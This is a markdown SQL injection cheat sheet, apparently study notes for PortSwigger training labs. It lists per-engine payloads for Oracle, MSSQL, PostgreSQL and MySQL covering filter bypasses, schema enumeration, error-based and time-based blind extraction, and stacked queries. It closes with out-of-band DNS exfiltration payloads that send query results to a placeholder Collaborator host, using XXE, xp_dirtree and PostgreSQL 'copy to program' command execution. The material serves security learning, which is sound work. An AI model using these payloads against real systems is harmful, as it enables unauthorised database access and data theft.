# SQL injection cheat sheet

Quick-reference syntax for common SQL injection tasks, with the **per-database** variants side by side. Identify the database first (see [Examining the database](Examining-the-database.md)), then grab the matching row.

> Part of the [SQL Injection](README.md) path. Companion to every technique note in this folder — this is the "which exact syntax on which engine" lookup they all point to.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [String concatenation](#string-concatenation)
- [Substring](#substring)
- [Comments](#comments)
- [Bypassing filters](#bypassing-filters)
- [Database version](#database-version)
- [Database contents](#database-contents)
- [Conditional errors](#conditional-errors)
- [Extracting data via visible error messages](#extracting-data-via-visible-error-messages)
- [Batched (stacked) queries](#batched-stacked-queries)
- [Time delays](#time-delays)
- [Conditional time delays](#conditional-time-delays)
- [DNS lookup](#dns-lookup)
- [DNS lookup with data exfiltration](#dns-lookup-with-data-exfiltration)

---

## In plain English

| Topic | The idea | Takeaway |
| --- | --- | --- |
| **Cheat sheet** | The same attack needs different syntax on Oracle vs MSSQL vs PostgreSQL vs MySQL | Don't memorise all four. Fingerprint the DB, then copy the correct row. This page collects the syntax the technique notes keep referring to. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> pure reference. Match the <em>engine</em> (Oracle / Microsoft / PostgreSQL / MySQL) to the <em>task</em>, and mind the small gotchas (Oracle needs <code>FROM dual</code>; MySQL <code>--</code> needs a trailing space).
</div>

---

## String concatenation

Join strings into one — used to pack multiple fields into a single column.

| Database | Syntax |
| --- | --- |
| Oracle | `'foo'\|\|'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'\|\|'bar'` |
| MySQL | `'foo' 'bar'` *(space between)* or `CONCAT('foo','bar')` |

---

## Substring

Extract part of a string from a **1-based** offset with a given length. All of these return `ba` from `foobar`:

| Database | Syntax |
| --- | --- |
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

---

## Comments

Truncate the rest of the original query after your injection.

| Database | Syntax |
| --- | --- |
| Oracle | `--comment` |
| Microsoft | `--comment` or `/*comment*/` |
| PostgreSQL | `--comment` or `/*comment*/` |
| MySQL | `#comment`, `-- comment` *(space after `--`)*, or `/*comment*/` |

---

## Bypassing filters

If an app blocks specific keywords or characters:

- **Vary the case** — SQL keywords aren't case-sensitive, so `SeLeCT` bypasses a filter blocking `SELECT`.
- **Inline comments as whitespace** — `SELECT/**/username/**/FROM/**/users` dodges a filter matching a keyword surrounded by spaces.
- **MySQL versioned comments** — the DB executes the contents of `/*! ... */`, so `/*!SELECT*/` runs as `SELECT` while hiding it from the filter.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Encoding-based bypasses</strong> (URL-encoding keywords, <code>CHAR()</code> to build strings, XML-entity encoding) are a separate technique — see <a href="SQL-injection-in-different-contexts.md">SQL injection in different contexts</a>.
</div>

---

## Database version

| Database | Query |
| --- | --- |
| Oracle | `SELECT banner FROM v$version` / `SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

---

## Database contents

List tables, then columns within a table.

| Database | Queries |
| --- | --- |
| Oracle | `SELECT * FROM all_tables` · `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft | `SELECT * FROM information_schema.tables` · `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` · `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables` · `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

> Oracle has **no** `information_schema` — use `all_tables` / `all_tab_columns`.

---

## Conditional errors

Trigger a DB error only if a boolean condition is true (for [blind SQLi via conditional errors](Exploiting-blind-SQLi-conditional-errors.md)).

| Database | Syntax |
| --- | --- |
| Oracle | `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a')` |

---

## Extracting data via visible error messages

Leak query data inside an error string (see [verbose error messages](Extracting-data-via-verbose-SQL-error-messages.md)).

| Database | Syntax → error |
| --- | --- |
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` → *Conversion failed when converting the varchar value 'secret' to data type int.* |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → *invalid input syntax for integer: "secret"* |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` → *XPATH syntax error: '\secret'* |

---

## Batched (stacked) queries

Run multiple queries in succession. Results of the later queries are **not** returned, so this is mainly for **blind** vulns (chain a second query that triggers a DNS lookup, conditional error, or time delay).

| Database | Syntax |
| --- | --- |
| Oracle | Not supported |
| Microsoft | `QUERY-1; QUERY-2` (also `QUERY-1 QUERY-2`) |
| PostgreSQL | `QUERY-1; QUERY-2` |
| MySQL | `QUERY-1; QUERY-2` |

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>MySQL caveat:</strong> batched queries usually <em>can't</em> be used for injection — only occasionally, when the app talks to MySQL through certain PHP or Python APIs.
</div>

---

## Time delays

Unconditional 10-second delay (see [time delays](Exploiting-blind-SQLi-time-delays.md)).

| Database | Syntax |
| --- | --- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

---

## Conditional time delays

Delay only if a boolean condition is true.

| Database | Syntax |
| --- | --- |
| Oracle | `SELECT CASE WHEN (COND) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF (COND) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(COND,SLEEP(10),'a')` |

---

## DNS lookup

Force an out-of-band DNS lookup to a Burp Collaborator subdomain (see [OAST techniques](Exploiting-blind-SQLi-out-of-band-OAST.md)).

| Database | Syntax |
| --- | --- |
| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` *(XXE trick; patched, but many unpatched installs exist)* — or, on patched Oracle **with elevated privileges**: `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL *(Windows only)* | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` or `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

---

## DNS lookup with data exfiltration

Same as above, but bake a subquery's result into the looked-up subdomain so the data leaks in the DNS request.

**Oracle:**
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Microsoft:**
```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

**PostgreSQL:**
```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

**MySQL** *(Windows only):*
```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Reminder:</strong> OAST payloads are engine- and privilege-specific, and PortSwigger labs require Burp Collaborator's <strong>default public</strong> server (the lab firewall blocks arbitrary external systems).
</div>
